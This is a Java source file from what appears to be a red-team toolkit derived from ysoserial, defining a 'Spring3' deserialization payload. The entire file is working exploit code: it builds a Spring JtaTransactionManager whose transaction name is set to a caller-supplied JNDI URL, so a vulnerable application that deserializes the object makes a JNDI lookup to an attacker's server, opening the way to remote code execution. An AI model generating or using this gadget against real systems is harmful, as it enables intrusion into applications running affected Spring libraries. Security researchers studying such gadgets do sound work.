package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.custom.CustomCommand;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import org.springframework.transaction.jta.JtaTransactionManager;

@Dependencies({
        "org.springframework:spring-tx:5.2.3.RELEASE",
        "org.springframework:spring-context:5.2.3.RELEASE",
        "javax.transaction:javax.transaction-api:1.2"
})
@Authors({Authors.WH1T3P1G})
public class Spring3 extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        if (!command.toLowerCase().startsWith(CustomCommand.COMMAND_JNDI)) {
            throw new Exception(String.format("Command [%s] not supported", command));
        }

        String jndiUrl = command.substring(CustomCommand.COMMAND_JNDI.length());
        JtaTransactionManager manager = new JtaTransactionManager();
        manager.setUserTransactionName(jndiUrl);
        return manager;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Spring3.class, args);
    }
}
